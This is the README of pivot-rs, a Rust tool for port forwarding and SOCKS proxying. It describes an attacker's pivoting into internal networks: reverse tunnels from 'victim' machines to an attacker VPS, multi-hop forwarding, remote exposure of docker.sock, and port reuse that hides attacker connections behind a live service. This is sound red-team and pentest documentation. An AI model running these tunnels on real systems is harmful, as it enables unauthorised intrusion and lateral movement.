`pivot-rs` is a lightweight port-forwarding and socks proxy tool written in Rust 🦀

## Build

The project is under development, so you need to build yourself.

```bash
git clone https://github.com/X1r0z/pivot-rs
cd pivot-rs
cargo build --release
```

## Feature

- TCP/UDP port forwarding
- Unix domain socket forwarding (e.g. `/var/run/docker.sock`)

### TCP Port Forwarding

Listen on `0.0.0.0:8888` and `0.0.0.0:9999`, forward traffic between them.

*specify `127.0.0.1:PORT` to listen on local address*

```bash
./pivot fwd -l 8888 -l 9999
```

Listen on `0.0.0.0:8888`, forward traffic to a remote address.

```bash
./pivot fwd -l 8888 -r 10.0.0.1:9999
```

Connect `10.0.0.1:8888` and `10.0.0.2:9999`, forward traffic between them.

```bash
./pivot fwd -r 10.0.0.1:8888 -r 10.0.0.1:9999
```

A basic example of accessing an intranet address through port forwarding.

```bash
# on attacker's machine
./pivot fwd -l 8888 -l 9999

# on victim's machine
./pivot fwd -r 10.0.0.1:3389 -r vps:8888

# now attacker can access 10.0.0.1:3389 through vps:9999
```

A complex example, multi-layer forwarding in the intranet.

```bash
# on machine A (10.0.0.1, 172.16.0.1)
./pivot fwd -r 10.0.0.10:3389 -l 7777

# on machine B (172.16.0.2, 192.168.1.1)
./pivot fwd -r 172.16.0.1:7777 -r 192.168.1.2:8888

# on machine C (192.168.1.2, DMZ)
./pivot fwd -l 8888 -r vps:9999

# on attacker's machine
./pivot fwd -l 9999 -l 33890

# now attacker can access 10.0.0.10:3389 through vps:33890
```

Note that the command on machine B need to be executed last. Because this mode will check the connectivity between the two remote addresses.

### UDP Port Forwarding

The usage of UDP port forwarding is similar to TCP, simply add `-u` flag.

This feature may be unstable.

Note that when using **reverse** UDP port forwarding, a handshake packet will be sent to keep the client address.

Example:

```bash
# on attacker's machine
./pivot fwd -l 8888 -l 9999

# on victim's machine
./pivot fwd -r 10.0.0.1:53 -r vps:8888
```

The victim's machine will send a 4-byte handshake packet (with all 0s) to `vps:8888`, which is the attacker's machine.

The attacker's machine will remember the client address, and forward the traffic to it when user connects to `vps:9999`.

**Because of the handshake packet, the parameters must be in order and cannot be swapped.**

Another example:

```bash
# on machine A (10.0.0.1, 192.168.1.1, intranet)
./pivot fwd -r 10.0.0.10:53 -l 7777

# on machine B (192.168.1.2, DMZ)
./pivot fwd -r 192.168.1.1:7777 -r vps:8888 # this command need to be executed last

# on attacker's machine
./pivot fwd -l 8888 -l 9999
```

The handshake packet will be sent from machine B to the attacker's machine (port 8888). Users can connect to the intranet through port 9999.

### Unix domain socket Forwarding

*This feature is only supported on Linux and macOS*

A Unix domain socket is a IPC (Inter-Process Communication) method that allows data to be exchanged between processes running on the same machine.

`/var/run/docker.sock` and `/var/run/php-fpm.sock` are common Unix domain sockets.

You can forward Unix domain socket to a TCP port.

```bash
./pivot fwd -s /var/run/docker.sock -l 4444

# get docker version
curl http://127.0.0.1:4444/version
```

or in the reverse mode.

```bash
# on victim's machine
./pivot fwd -s /var/run/docker.sock -r vps:4444

# on attacker's machine
./pivot fwd -l 4444 -l 5555

# get docker version
curl http://vps:5555/version
```

### Socks Proxy

`pivot-rs` supports socks5 protocol (no/with authentication)

Forward socks proxy

```bash
./pivot proxy -l 1080
```

Reverse socks proxy

```bash
# on attacker's machine
./pivot proxy -l 7777 -l 8888

# on victim's machine
./pivot proxy -r vps:7777

# now attacker can use socks proxy on vps:8888
```

To enable authentication, simply add `user:pass` after the `-a` flag.

```bash
./pivot proxy -l 1080 -a user:pass
```

`pivot-rs` will generate a random username and password if you pass a string to `-a` flag which does not have the `user:pass` format.

```bash
./pivot proxy -l 1080 -a rand

# the random username and password will be output to the console
```

### TLS Encryption

TLS encryption is supported for TCP, Unix domain socket forwarding and socks proxy.

To enable encryption, simple add `+` sign in front of the address or port.

For ease of use, the server uses a self-signed TLS certificate by default, and the client trusts all certificates (no verify).

Example of a TLS encrypted TCP port forwarding.

```bash
# on attacker's machine
./pivot fwd -l +7777 -l 33890

# on victim's machine
./pivot fwd -r 127.0.0.1:3389 -r +vps:7777

# now attacker can access 3389 through vps:33890, and the traffic on port 7777 will be encrypted
```

Example of a TLS encrypted reverse socks proxy.

```bash
# on attacker's machine
./pivot proxy -l +7777 -l 8888

# on victim's machine
./pivot proxy -r +vps:7777

# now attacker can use socks proxy on vps:8888, and the traffic on port 7777 will be encrypted
```

### TCP Port Reuse

`pivot-rs` supports TCP port reuse with `SO_REUSEADDR` and `SO_REUSEPORT` options.

The behavior of port reuse differs from operation systems.

In Windows, there is only `SO_REUSEADDR` option, which allows multiple sockets to bind to the same address and port. But there are some limitations, depending on the accounts `pivot-rs` is running under, and the ip address you are binding to.

e.g. binding to `0.0.0.0` (wildcard address) or `192.168.1.1` (specific address) may have different results in some senarios.

[https://learn.microsoft.com/en-us/windows/win32/winsock/using-so-reuseaddr-and-so-exclusiveaddruse](https://learn.microsoft.com/en-us/windows/win32/winsock/using-so-reuseaddr-and-so-exclusiveaddruse)

In Linux, there are both `SO_REUSEADDR` and `SO_REUSEPORT` options. The principle of port reuse is to bind different address.

For example, A machine has two IP addresses `192.168.1.1` and `10.0.0.1`. A program is listening on `10.0.0.1:80`, so you can bind to `192.168.1.1:80` to reuse port.

However, if a program is listening on `0.0.0.0:80`, then you cannot reuse the port because binding to any other address with port 80 is not allowed.

In short, if someone has already bound to `0.0.0.0`, the game is over.

Of course, there is still a way to reuse port with the same address and port, that is, the program itself sets `SO_REUSEPORT`, and the uid of the user executing the program is the same as the uid of the user executing `pivot-rs`.

In macOS, most of the behavior is the same as in Linux, but it is more flexible. Even if a program is bound to `0.0.0.0`, you can still bind to other specific IP addresses, such as `192.168.1.1`, to reuse port. (But not vice versa)

To reuse a port, you need to specify the local address, remote address, fallback address and external address.

`-l` specify the local address you are reusing

`-r` specify the remote address you are redirecting to

`-f` specify the fallback address that other people who are not from the external address will connect to (e.g. normal users)

`-e` specify the external address of attacker's machine, which will connect to the remote address through port reuse mechanism

For example, reuse the port 8000

```bash
./pivot reuse -l 192.168.1.1:8000 -r 10.0.0.1:22 -f 127.0.0.1:8000 -e 1.2.3.4
```

Attackers from external address `1.2.3.4` will connect to `10.0.0.1:22` through `192.168.1.1:8000`, the normal users will fallback to `127.0.0.1:8000` (prevent the service on port 8000 being affected)

It is not recommended to reuse ports on `0.0.0.0` address although it may work in some cases, because it will make the fallback address useless (the fallback connection will be looped in `pivot-rs` and finally cause a crash)
